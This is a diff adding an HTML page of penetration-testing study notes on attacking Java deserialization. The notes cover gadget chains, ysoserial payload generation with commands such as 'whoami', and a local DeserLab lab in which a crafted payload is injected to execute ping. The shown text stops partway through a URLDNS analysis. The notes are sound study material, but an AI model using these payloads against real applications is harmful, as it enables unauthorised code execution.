@@ -1,0 +1,2215 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>10 - Attacking Serialization |</title>
+<meta name="description" content="Attacking Serialization in Java, PHP and .NET ">
+
+
+  <meta name="author" content="Nullified">
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="">
+<meta property="og:title" content="10 - Attacking Serialization">
+<meta property="og:url" content="http://localhost:4000/notes/ewptx/zattackingserialization/">
+
+
+  <meta property="og:description" content="Attacking Serialization in Java, PHP and .NET ">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/main/header3.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2023-12-02T00:00:00+06:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/notes/ewptx/zattackingserialization/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "john",
+      "url": "http://localhost:4000/"
+    
+  }
+</script>
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title=" Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+<!-- favicon -->
+<link rel="icon" type="image/jpeg" sizes="32x32" href="/assets/images/main/fav-32x32.jpeg">
+<link rel="icon" type="image/jpeg" sizes="16x16" href="/assets/images/main/fav-16x16.jpeg">
+<meta name="theme-color" content="#ffffff">
+
+  </head>
+
+  <body class="layout--single single">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/main/kaizen.png" alt=""></a>
+        
+        <a class="site-title" href="/">
+          
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/">Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/menu">Menu</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about">About</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+  
+    
+
+    <div class="initial-content">
+      
+  
+
+
+
+
+
+
+
+<div class="page__hero--overlay"
+  style=" background-image: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url('/assets/images/main/header3.jpg');"
+>
+  
+    <div class="wrapper">
+      <h1 id="page-title" class="page__title" itemprop="headline">
+        
+          10 - Attacking Serialization
+
+        
+      </h1>
+      
+        <p class="page__lead">Attacking Serialization in Java, PHP and .NET
+</p>
+      
+      
+        <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  37 minute read
+
+</p>
+      
+      
+      
+    </div>
+  
+  
+</div>
+
+
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+  
+    
+      
+      
+      
+      
+    
+    
+      
+
+<nav class="nav__list">
+  
+  <input id="ac-toc" name="accordion-toc" type="checkbox" />
+  <label for="ac-toc">Toggle menu</label>
+  <ul class="nav__items">
+    
+      <li>
+        
+          <span class="nav__sub-title">Posts</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/insights/roadmap/">- How to become a Pentester (2024)</a></li>
+          
+            <li><a href="/awareness/awarenessdoc/">- Security Awareness</a></li>
+          
+            <li><a href="/c2/sliverbasics/">- Sliver C2 Basics</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+        </ul>
+        
+      </li>
+    
+      <li>
+        
+          <span class="nav__sub-title">Notes</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/notes/ejpt/">eJPT</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/ecppt/">eCPPTv2</a></li>
+          
+            <li><a href="/notes/ecppt/systemsecurity/">- System Security</a></li>
+          
+            <li><a href="/notes/ecppt/networksecurity/">- Network Security</a></li>
+          
+            <li><a href="/notes/ecppt/powershell/">- Powershell</a></li>
+          
+            <li><a href="/notes/ecppt/linux/">- Linux Security</a></li>
+          
+            <li><a href="/notes/ecppt/webapp/">- Web App Security</a></li>
+          
+            <li><a href="/notes/ecppt/wifi/">- Wi-Fi Pentest</a></li>
+          
+            <li><a href="/notes/ecppt/ruby/">- Metasploit & Ruby</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/pnpt/">PNPT</a></li>
+          
+            <li><a href="/notes/pnpt/peh/">- Practical Ethical Hacker</a></li>
+          
+            <li><a href="/notes/pnpt/osint/">- OSINT</a></li>
+          
+            <li><a href="/notes/pnpt/pentestexternal/">- External Pentest Playbook</a></li>
+          
+            <li><a href="/notes/pnpt/linuxprivesc/">- Linux Privesc</a></li>
+          
+            <li><a href="/notes/pnpt/winprivesc/">- Windows Privesc</a></li>
+          
+            <li><a href="/notes/pnpt/wpivoting/">- Movement, Pivoting and Persistence</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/eewptx/">eWPTXv2</a></li>
+          
+            <li><a href="/notes/ewptx/encoding/">- Encoding & Filtering</a></li>
+          
+            <li><a href="/notes/ewptx/evasionbasics/">- Evasion Basics</a></li>
+          
+            <li><a href="/notes/ewptx/xss/">- Cross-site scripting (XSS)</a></li>
+          
+            <li><a href="/notes/ewptx/xssfilter/">- XSS Filter Evasion</a></li>
+          
+            <li><a href="/notes/ewptx/csrf/">- Cross-site request forgery (CSRF)</a></li>
+          
+            <li><a href="/notes/ewptx/html5/">- HTML5</a></li>
+          
+            <li><a href="/notes/ewptx/sqli/">- SQL Injection</a></li>
+          
+            <li><a href="/notes/ewptx/sqlievasion/">- SQLI Filter Evasion</a></li>
+          
+            <li><a href="/notes/ewptx/xmlattacks/">- XML Attacks</a></li>
+          
+            <li><a href="/notes/ewptx/zattackingserialization/" class="active">- Attacking Serialization</a></li>
+          
+            <li><a href="/notes/ewptx/serverside/">- Server Side Attacks</a></li>
+          
+            <li><a href="/notes/ewptx/crypto/">- Attacking Crypto</a></li>
+          
+            <li><a href="/notes/ewptx/authenticationsso/">- Authentication & SSO</a></li>
+          
+            <li><a href="/notes/ewptx/apiscloud/">- APIs & Cloud Apps</a></li>
+          
+            <li><a href="/notes/ewptx/ldap/">- Attacking LDAP</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="">Active Directory Exploitation</a></li>
+          
+            <li><a href="/notes/adx/powershell/">- Powershell</a></li>
+          
+            <li><a href="/notes/adx/bloodhound/">- Bloodhound</a></li>
+          
+            <li><a href="/notes/adx/privesc/">- Win Privesc</a></li>
+          
+            <li><a href="/notes/adx/zlateralmov/">- Lateral Movement</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/crtp/">CRTP</a></li>
+          
+            <li><a href="/notes/crtp/enum/">- AD Enumeration</a></li>
+          
+            <li><a href="/notes/crtp/winprivesc/">- Local Privesc</a></li>
+          
+            <li><a href="/notes/crtp/latmov/">- Lateral Movement</a></li>
+          
+            <li><a href="/notes/crtp/offdotnet/">- Offensive .NET</a></li>
+          
+            <li><a href="/notes/crtp/domdom/">- AD Persistence</a></li>
+          
+            <li><a href="/notes/crtp/domprivesc/">- AD Privesc</a></li>
+          
+            <li><a href="/notes/crtp/defense/">- AD Defense</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/crte/">CRTE</a></li>
+          
+            <li><a href="/notes/crte/latmov/">- Lateral Movement</a></li>
+          
+            <li><a href="/notes/crte/adprivesc/">- AD Privesc</a></li>
+          
+            <li><a href="/notes/crte/adpersistence/">- AD Persistence</a></li>
+          
+            <li><a href="/notes/crte/cross/">- Cross attacks</a></li>
+          
+            <li><a href="/notes/crte/cheatsheet/">- Cheat Sheet</a></li>
+          
+        </ul>
+        
+      </li>
+    
+      <li>
+        
+          <span class="nav__sub-title">My CVEs</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/cve/xss/">CVE-2024-2479</a></li>
+          
+            <li><a href="/cve/sqli/">CVE-2024-2480</a></li>
+          
+        </ul>
+        
+      </li>
+    
+  </ul>
+</nav>
+
+    
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="10 - Attacking Serialization">
+    <meta itemprop="description" content="Attacking Serialization in Java, PHP and .NET">
+    <meta itemprop="datePublished" content="2023-12-02T00:00:00+06:00">
+    
+
+    <div class="page__inner-wrap">
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right ">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
+              <ul class="toc__menu">
+  <li><a href="#attacking-serialization">Attacking Serialization</a>
+    <ul>
+      <li><a href="#what-is-serialization">What is Serialization</a></li>
+      <li><a href="#serialization-in-java">Serialization in Java</a></li>
+      <li><a href="#introduction-to-ysoserial">Introduction to Ysoserial</a></li>
+      <li><a href="#exploiting-java-deserialization">Exploiting Java Deserialization</a></li>
+      <li><a href="#spotting-java-serialized-objects">Spotting Java Serialized Objects</a></li>
+      <li><a href="#serialization-in-php">Serialization in PHP</a></li>
+      <li><a href="#net-serialization">.NET Serialization</a></li>
+      <li><a href="#other-serialization">Other Serialization</a></li>
+      <li><a href="#lab-1">Lab 1</a></li>
+      <li><a href="#lab-2">Lab 2</a></li>
+      <li><a href="#lab-3">Lab 3</a></li>
+      <li><a href="#lab-4">Lab 4</a></li>
+    </ul>
+  </li>
+</ul>
+
+            </nav>
+          </aside>
+        
+        <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="nullified" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FF813F" data-position="Right" data-x_margin="18" data-y_margin="18"></script>
+
+<h1 id="attacking-serialization">Attacking Serialization</h1>
+
+<ul>
+  <li>What is Serialization?</li>
+  <li>Serialization in Java</li>
+  <li>Serialization in PHP</li>
+  <li>.NET Serialization</li>
+  <li>Other Serialization</li>
+</ul>
+
+<p>By the end of this module, u should have a better understanding of:</p>
+
+<ul>
+  <li>Serialization mechanims</li>
+  <li>How to find and exploit untrusted deserialization in common web technologies</li>
+</ul>
+
+<h2 id="what-is-serialization">What is Serialization</h2>
+<p>Serialization is the name of the mechanims that allows us to store the state of programmistic objects in a sequence of bytes in a reversible way. This way, an object (a variable, set of variables, or even a whole class) can be transported remotely to another program.</p>
+
+<ul>
+  <li>The receiving endpoint should be able to recronstruct (deserialize) the received object in an unchanged state.</li>
+</ul>
+
+<p>Used For:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>→ Storing and transferring data
+→ Calling remote procedures (RPC-like methods)
+</code></pre></div></div>
+
+<ul>
+  <li>Serialized data itself is not encrypted or signed in any way.</li>
+  <li>There might be transport protocols that utilize serialization together with compression and encryption.</li>
+  <li>So serialized data might be hidden, secured or encoutered in a plain form.</li>
+</ul>
+
+<blockquote>
+  <p>Serialized objects are most often encountered in web apps written in PHP, Java and .NET, but serialization is not limited to these languages only.</p>
+</blockquote>
+
+<h2 id="serialization-in-java">Serialization in Java</h2>
+<p>Install JDK:</p>
+<ul>
+  <li>https://www.oracle.com/technetwork/java/javase/downloads/jdk11-downloads-5066655.html</li>
+</ul>
+
+<p>Install JRE:</p>
+<ul>
+  <li>
+    <p>https://www.oracle.com/technetwork/java/javase/overview/index.html</p>
+  </li>
+  <li>
+    <p>javac = Java commandline compiler</p>
+  </li>
+</ul>
+
+<p>create two files:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- item.java # that holds the code For a class names item
+- Serialize.java # which contain the serialization logic
+</code></pre></div></div>
+
+<h3 id="creating-serialized-objects">Creating Serialized Objects</h3>
+<p>In order to use serialization, the program must import the <strong>java.io.Serializable</strong> package. Moreover, For the class to be serialized, it must implement a Serializable interface.</p>
+
+<p><img src="/assets/images/posts/ewptx/18.png" alt="Alt text" class="align-center" /></p>
+
+<ul>
+  <li><strong>item.java</strong> is a class that has two fields: id and name</li>
+  <li>in real-life, serializable classes can contain many fields and methods.</li>
+</ul>
+
+<p>So, in another file (in java one class should be contained in one file) that will make use of that class. First, it will create an instance of the item class, and then serialize that instance as well as save it to a file.</p>
+
+<p><img src="/assets/images/posts/ewptx/19.png" alt="Alt text" class="align-center" /></p>
+
+<ul>
+  <li>It converts the instance of the item class to a <strong>Stream of Bytes</strong></li>
+  <li>then its saved to a file caled <strong>data.ser</strong></li>
+  <li>the data.set is in binary format, but we can see some non-ASCII characters</li>
+</ul>
+
+<p>The file begins with:</p>
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">'</span><span class="n">ac</span> <span class="n">ed</span> <span class="mo">00</span> <span class="mo">05</span><span class="err">'</span> <span class="n">bytes</span><span class="o">,</span> <span class="n">which</span> <span class="n">is</span> <span class="n">a</span> <span class="n">standard</span> <span class="n">java</span> <span class="n">serialized</span> <span class="n">format</span> <span class="n">signature</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>When used in web applications, its often encoded using Base64
+The binary value of <strong>ac ed 00 05</strong> equals <strong>rO0AB==</strong></p>
+</blockquote>
+
+<h3 id="deserializing-data">Deserializing Data</h3>
+<p>After compilation and running the Deserialize class, we can see that the object was properly reconstructed</p>
+
+<p>If we change anything from the data.ser file and then try to Deserialize an error occurs</p>
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">ClassNotFoundException</span><span class="o">:</span> <span class="nc">Itxm</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/posts/ewptx/20.png" alt="Alt text" class="align-center" /></p>
+
+<h3 id="insecure-deserialization-conditions">Insecure Deserialization Conditions</h3>
+<p>When serializing and deserializing data, the deserializing endpoint must know (it must include in its classpath or import) all the classes and packages that the serialized object consists of.</p>
+
+<ul>
+  <li>Basically, attacking java serialization is about passing the malicious state of an object to the deserializing endpoint.</li>
+</ul>
+
+<p>Example: Executing OS commands in java:</p>
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">Java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">.</span><span class="na">exec</span><span class="o">(</span><span class="err">'</span><span class="n">whoami</span><span class="err">'</span><span class="o">)</span>
+</code></pre></div></div>
+
+<p>Properties and Reflection:
+An objects properties in their simplest form are spotted in the formar:</p>
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">Object</span><span class="o">.</span><span class="na">one</span><span class="o">.</span><span class="na">two</span>
+<span class="err">#</span> <span class="n">two</span> <span class="n">is</span> <span class="n">a</span> <span class="n">property</span> <span class="n">of</span> <span class="n">one</span>
+<span class="err">#</span> <span class="n">one</span> <span class="n">is</span> <span class="n">a</span> <span class="n">property</span> <span class="n">of</span> <span class="nc">Object</span>
+</code></pre></div></div>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">Java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">.</span><span class="na">exe</span><span class="o">(</span><span class="err">'</span><span class="n">id</span><span class="err">'</span><span class="o">)</span>
+<span class="err">#</span> <span class="n">method</span> <span class="nf">exec</span><span class="o">(</span><span class="err">'</span><span class="n">id</span><span class="err">'</span><span class="o">)</span> <span class="n">is</span> <span class="n">a</span> <span class="n">property</span> <span class="n">of</span> <span class="n">getRuntime</span>
+<span class="err">#</span> <span class="n">which</span> <span class="n">is</span> <span class="n">a</span> <span class="n">property</span> <span class="n">of</span> <span class="nc">Java</span><span class="o">.</span><span class="na">lava</span><span class="o">.</span><span class="na">Runtime</span>
+</code></pre></div></div>
+
+<ul>
+  <li>During deserialization, the objets properties are accessed recursively, leading to code execution at the very end of this process.</li>
+</ul>
+
+<p>→ Reflection: https://www.oracle.com/technical-resources/articles/java/javareflection.html</p>
+
+<blockquote>
+  <p>Can be recognized by the <strong>opaque</strong> calling order in the code</p>
+</blockquote>
+
+<blockquote>
+  <p>A potentially exploitable condition in Java occurs when <strong>readObject()</strong> or sia similar function is called on user-controlled object and later, a method on that object is called.</p>
+</blockquote>
+
+<p>An attacker is able to craft an object containing multiple, nested properties, that upon method call will do something completely different</p>
+
+<p>Implementing a Dynamic Proxy:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.baeldung.com/java-dynamic-proxies
+</code></pre></div></div>
+
+<p>Invocation handler:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.concretepage.com/java/dynamic-proxy-with-proxy-and-invocationhandler-in-java
+</code></pre></div></div>
+
+<h3 id="gadgets">Gadgets</h3>
+<p>Every property or method that is part of a nested exploit object is called a gadget</p>
+
+<ul>
+  <li>gadgets libraries are some java libraries that were identified to contain gadgets used to build serialized exploit objects.</li>
+</ul>
+
+<p>It was first presented as:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://frohoff.github.io/appseccali-marshalling-pickles/
+</code></pre></div></div>
+
+<p>Does not mean that gadgets libraries are insecure, it means that an attacker can abuse them to construct a known gadget chain that will result in seccessful exploitation.</p>
+
+<p>There is a tool called <strong>ysoserial</strong> that can be used to perform exploitation of insecure java deserialization vulnerabilties.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/frohoff/ysoserial
+</code></pre></div></div>
+
+<h2 id="introduction-to-ysoserial">Introduction to Ysoserial</h2>
+<p>It can be downloaded along with the source code and a precompiled .jar file</p>
+
+<ul>
+  <li>https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar</li>
+</ul>
+
+<p>Usage:</p>
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">java</span> <span class="o">-</span><span class="n">jar</span> <span class="n">ysoserial</span><span class="o">.</span><span class="na">jar</span> <span class="c1">//displays the help message</span>
+</code></pre></div></div>
+
+<p>Often we need to convert the output to Base64 in order to be able to send it to an application.</p>
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">java</span> <span class="o">-</span><span class="n">jar</span> <span class="n">ysoserial</span><span class="o">-</span><span class="n">master</span><span class="o">-</span><span class="no">SNAPSHOT</span><span class="o">.</span><span class="na">jar</span> <span class="nc">CommonsCollections1</span> <span class="s">"whoami"</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>This command generates a serialized payload, that upon being insecurely deserialized by an application that includes CommonCollections1 in its classpath, will result in executing the command <strong>whoami</strong></p>
+</blockquote>
+
+<p>Additions to Ysoserial:</p>
+
+<ul>
+  <li>Several Burpsuite Pro extensions have been developed in order to make java serialization detection and exploitation easier.</li>
+</ul>
+
+<p>Such as:</p>
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">Freddy</span><span class="o">,</span> <span class="nc">Deserialization</span> <span class="nc">Bug</span> <span class="nl">Finder:</span>
+<span class="err">#</span> <span class="nl">https:</span><span class="c1">//portswigger.net/bappstore/ae1cce0c6d6c47528b4af35faebc3ab3</span>
+
+<span class="nc">Java</span> <span class="nc">Deserialization</span> <span class="nl">Scanner:</span>
+<span class="err">#</span> <span class="nl">https:</span><span class="c1">//portswigger.net/bappstore/228336544ebe4e68824b5146dbbd93ae</span>
+</code></pre></div></div>
+
+<h3 id="brute-force-attack-with-ysoserial">brute-Force Attack with Ysoserial</h3>
+<p>When approaching an application that utilizes serialized java data, we dont know what libraries are used by the backend.</p>
+
+<ul>
+  <li>In this case, brute-force approach might work. We can generate all possible Ysoserial payloads and the try each of them against the target software</li>
+</ul>
+
+<p><img src="/assets/images/posts/ewptx/21.png" alt="Alt text" class="align-center" /></p>
+
+<blockquote>
+  <p>The script will run and create a Base64-encoded serialized payload For each vulnerable library. The result files can be further used in Burp Intruder Attacks</p>
+</blockquote>
+
+<h3 id="exploring-ysoserial">Exploring Ysoserial</h3>
+<p>Each of the <em>.java</em> files can be run as a separate java class, resulting in executing different code by the <em>Ysoserial</em> tool.</p>
+
+<ul>
+  <li>Its possible to select and invoke a single method out of a jar archive</li>
+</ul>
+
+<p>With the command line java utility:</p>
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">-</span><span class="n">cp</span> <span class="o">(</span><span class="n">classpath</span><span class="o">)</span> <span class="n">argument</span>
+</code></pre></div></div>
+
+<ul>
+  <li>The classpath contains all locations where the java virtual machine will look For methods available For the process runtime. In that case, we need to specify the Ysoserial .jar file as the classpath.</li>
+</ul>
+
+<p>Inside the the package Ysoserial there is a folder exploit that contains several classes. Each of these classes contain an exploit utility</p>
+
+<p>Example ysoserial/exploit/JSF.java:</p>
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">java</span> <span class="o">-</span><span class="n">cp</span> <span class="n">ysoserial</span><span class="o">.</span><span class="na">jar</span> <span class="n">ysoserial</span><span class="o">.</span><span class="na">exploit</span><span class="o">.</span><span class="na">JSF</span>
+</code></pre></div></div>
+
+<p>The JSF payload can be used to attack serialization in Java Faces VIEWSTATE parameter.</p>
+
+<blockquote>
+  <p>Keep in mind, that we omit the .java extension, which is assumed by default by the java environment.</p>
+</blockquote>
+
+<h2 id="exploiting-java-deserialization">Exploiting Java Deserialization</h2>
+<p>→ https://github.com/NickstaDB/DeserLab</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># run the server and client</span>
+<span class="c"># open wireshark to sniff the network</span>
+
+<span class="c"># server:</span>
+Java <span class="nt">-jar</span> DeserLab.jar <span class="nt">-server</span> 127.0.0.1 6666
+
+<span class="c"># try to connect with netcat:</span>
+nc 127.0.0.1 6666
+</code></pre></div></div>
+<ul>
+  <li>We can see that the server received our connection</li>
+</ul>
+
+<p>Lets try to connect with the DeserLabs client:</p>
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">java</span> <span class="o">-</span><span class="n">jar</span> <span class="nc">DeserLab</span><span class="o">.</span><span class="na">jar</span> <span class="o">-</span><span class="n">client</span> <span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span> <span class="mi">6666</span>
+</code></pre></div></div>
+
+<ul>
+  <li>In wireshark we can see Java serialized data in the communication</li>
+  <li>Save the wireshark dump as deserialization.pcap</li>
+</ul>
+
+<h3 id="deciphering-serialized-data">Deciphering Serialized Data</h3>
+<p>In order to automate revision of all packages sent:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tshark tool
+<span class="c"># it can extracted the serialization stream</span>
+
+<span class="c"># syntax:</span>
+tshark <span class="nt">-r</span> deserialization.pcap <span class="nt">-T</span> fields <span class="nt">-e</span> tcp.srcport <span class="nt">-e</span> data <span class="nt">-e</span> tcp.dstport <span class="nt">-E</span> <span class="nv">separator</span><span class="o">=</span>, | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s1">',,'</span> | <span class="nb">grep</span> <span class="s1">'^6666,'</span> | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">','</span> <span class="nt">-f2</span> | <span class="nt">-tr</span> <span class="s1">'\n'</span> <span class="s1">':'</span> | <span class="nb">sed </span>s/://g
+</code></pre></div></div>
+
+<p>For every object/value transported in Java serialized data, there is a predecing byte of certain value that identifies its type</p>
+
+<p><img src="/assets/images/posts/ewptx/22.png" alt="Alt text" class="align-center" /></p>
+
+<p>We can inspect any Java Serialized stream to identify the object it contains using the Java Serialization Dumper tool</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/NickstaDB/SerializationDumper
+</code></pre></div></div>
+
+<ul>
+  <li>The tool takes  a hex representation of serialized bytes and dumps the objects the byte stream consists of.</li>
+</ul>
+
+<p><img src="/assets/images/posts/ewptx/23.png" alt="Alt text" class="align-center" /></p>
+
+<blockquote>
+  <p>The tool dumps every object that is contained with the serialized stream</p>
+</blockquote>
+
+<h3 id="injecting-serialized-payload">Injecting Serialized Payload</h3>
+<p>We will build a python script that mimic the initial serizalized handshake (0xaced0005) and then replace the serialized data (in this case the string hash with the Ysoserial payload and hope For code execution)</p>
+
+<ul>
+  <li>Based on the output of Serialization Dumper, part of the communication must be mimicked using python; this includes the handshake, two TC_BLOCKDATA structures and the username</li>
+  <li>Further down our exploit the hashed string will be replaced with serialized data originating from the Ysoserial tool</li>
+</ul>
+
+<p>In this case the Groovy library is chosen since its utilized by DeserLab.</p>
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">java</span> <span class="o">-</span><span class="n">jar</span> <span class="n">ysoserial</span><span class="o">-</span><span class="n">master</span><span class="o">-</span><span class="no">SNAPSHOT</span><span class="o">.</span><span class="na">jar</span> <span class="nc">Groovy1</span> <span class="s">"ping 127.0.0.1"</span> <span class="o">&gt;</span> <span class="n">p</span><span class="o">.</span><span class="na">bin</span>
+</code></pre></div></div>
+
+<p>The payload contains the java serialization signature in the beginning. Since the serialized conversation is already started, we should remove it from the payload.</p>
+
+<p><img src="/assets/images/posts/ewptx/24.png" alt="Alt text" class="align-center" /></p>
+
+<p>As previously mentioned, it contains all structures dumped by the SerializationDumper tool until the hashed string, which is replaced by the Ysoserial payload without its first 4 bytes (aced0005)</p>
+
+<p>Lets now listen to any ICMP packets on the loopback (127.0.0.1) interface while attacking the DeserLab server using our freshly prepared exploit.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tcpdump <span class="nt">-i</span> lo icmp
+python serialization.py
+</code></pre></div></div>
+
+<blockquote>
+  <p>The server received the connection and ping was executed</p>
+</blockquote>
+
+<h3 id="analysis-of-urldns-payload">Analysis of URLDNS Payload</h3>
+<p><em>URLDNS</em> is a payload from Ysoserial. It does not result in code execution</p>
+
+<ul>
+  <li>Instead, it makes the deserializing endpoint resolve an arbritary DNS name.</li>
+  <li>It has low impact, but on the other hand it uses Java built-in features, so its likely to work almost in every case.</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java
+</code></pre></div></div>
+
+<p>We can observe a gadget chain of 4 objects</p>
+
+<p>Gadget Chain:</p>
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">HashMap</span><span class="o">.</span><span class="na">readObject</span><span class="o">()</span>
+  <span class="nc">HashMap</span><span class="o">.</span><span class="na">putVal</span><span class="o">()</span>
+    <span class="nc">HashMap</span><span class="o">.</span><span class="na">hash</span><span class="o">()</span>
+      <span class="no">URL</span><span class="o">.</span><span class="na">hashCode</span><span class="o">()</span>
+</code></pre></div></div>
+
+<p>*HashMap.readObject()** causes Java to instantiate the deserialized object upon successfull deserialization. The hashmap contains a hashed URL object, which due to java built-in mechanisms, will be arbritraty resolved.</p>
+
+<ul>
+  <li>Its crafted in the public method getObject</li>
+  <li>HashMap is a Java data type that stored data in key-value pairs, its often used in deserialization exploits</li>
+</ul>
+
